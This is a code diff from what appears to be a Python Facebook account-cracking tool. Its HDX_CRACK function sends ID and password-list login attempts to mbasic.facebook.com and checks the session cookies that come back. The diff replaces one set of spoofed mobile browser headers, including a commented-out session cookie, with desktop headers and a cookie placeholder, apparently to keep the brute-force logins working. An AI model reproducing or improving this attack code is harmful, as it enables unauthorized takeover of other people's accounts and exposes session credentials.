@@ -460,24 +460,15 @@ def HDX_CRACK(ids,passlist,tl):
             "pass":pas,
             "login":"Log In"}
             header_freefb = {
-            'authority': 'mbasic.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-            'cache-control': 'max-age=0',
-           # 'cookie': 'datr=V9oOZGQ2su-bTcq9ox4FsYKe; sb=WNoOZAwcL-evgVtvGSBgTF9R; m_pixel_ratio=1.75; wd=412x772; fr=0SjJYqYFypjiV5QvC..BkDtpk.bw.AAA.0.0.BkD5nM.AWUEZBF2Mwc',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&_rdr',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+            'Host': 'mbasic.facebook.com',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Cookie': 'Your Cookie',
+            'Upgrade-Insecure-Requests': '1',
+            'TE': 'Trailers',
 }
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fmbasic.facebook.com%2F&refsrc=deprecated&lwv=100&refid=9',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
